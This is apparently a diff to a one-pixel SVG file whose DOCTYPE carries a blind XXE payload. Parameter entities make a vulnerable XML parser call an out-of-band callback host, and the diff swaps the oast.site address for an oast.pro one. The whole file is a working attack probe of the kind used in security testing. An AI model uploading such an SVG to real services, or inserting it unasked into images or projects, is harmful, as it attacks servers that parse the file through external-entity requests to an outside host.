@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
-  <!ENTITY % file SYSTEM "https://d7dv2qsgtqkmhnv62220ub7pcyf64q4xh.oast.site">
-  <!ENTITY % payload "<!ENTITY send SYSTEM 'https://d7dv2qsgtqkmhnv62220ub7pcyf64q4xh.oast.site;'>">
+  <!ENTITY % file SYSTEM "https://d9k44gao12pk7ivvil90wwrfnbt7ga67a.oast.pro">
+  <!ENTITY % payload "<!ENTITY send SYSTEM 'https://d9k44gao12pk7ivvil90wwrfnbt7ga67a.oast.pro;'>">
   %payload;
 ]>
-<svg xmlns="https://d7dv2qsgtqkmhnv62220ub7pcyf64q4xh.oast.site" width="1" height="1">
+<svg xmlns="https://d9k44gao12pk7ivvil90wwrfnbt7ga67a.oast.pro" width="1" height="1">
   <text>&send;</text>
 </svg>
